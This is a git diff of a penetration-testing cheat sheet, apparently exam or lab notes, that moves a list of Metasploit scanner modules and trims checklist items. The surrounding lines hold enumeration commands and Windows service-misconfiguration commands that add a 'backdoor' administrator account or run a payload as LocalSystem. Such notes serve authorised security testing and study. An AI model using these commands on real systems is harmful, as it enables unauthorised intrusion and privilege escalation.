@@ -30,8 +30,6 @@ Linux SMB Enum
 $ enum4linux [ target_ip ]	# Enumerate Windows / Samba (SMB) hosts.
 ```
 
-!! FOLLOW A PROCESS !!
-
 ### RECON - WEBAPP
 
 Scripts:
@@ -46,14 +44,6 @@ $ gobuster -u http://10.11.1.71/cgi-bin/ \				  # 2nd directory brute-force
 	   -s '200,204,403,500' -e
 ```
 
-Other things to check:
-* robots.txt
-* social media
-* source code (if app is based on open-source code)
-
-Re-evaluate attack surface:
-* Any new findings to add to our list of attack vectors?
-
 ### FIND VULNS + EXPLOIT CODE
 
 Tools:
@@ -66,11 +56,18 @@ $ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]
 
 # Nmap Scripting ENgine
 $ ls -l /usr/share/nmap/scripts/*service_name*
+```
 
+Metasploit Auxiliry Modules:
+```
+$ use auxiliary/scanner/http/dir_scanner		# HTTP directory scanner
+$ use auxiliary/scanner/http/jboss_vulnscan	# JBOSS vulnerability scanner
+$ use auxiliary/scanner/mssql/mssql_login	# MSSQL Login Module
+$ use auxiliary/scanner/mysql/mysql_version	# MSSQL Version Scanner
+$ use auxiliary/scanner/oracle/oracle_login	# Oracle Login Module
 ```
 
 Other areas to find exploit code:
-* Google Shellshock POC
 * Google one-liners from github
 
 If no good attack vectors / exploit can be found, try a different or more comprehensive wordlist for subdirectory brute-forcing or use a webapp scanner to poke harder at the system.
@@ -160,15 +157,6 @@ sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
 
 sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
 net start <vulnerable-service>
-```
-
-Metasploit Auxiliry Modules:
-```
-$ use auxiliary/scanner/http/dir_scanner		# HTTP directory scanner
-$ use auxiliary/scanner/http/jboss_vulnscan	# JBOSS vulnerability scanner
-$ use auxiliary/scanner/mssql/mssql_login	# MSSQL Login Module
-$ use auxiliary/scanner/mysql/mysql_version	# MSSQL Version Scanner
-$ use auxiliary/scanner/oracle/oracle_login	# Oracle Login Module
 ```
 
 ### EXPLOITS - USING / COMPILING
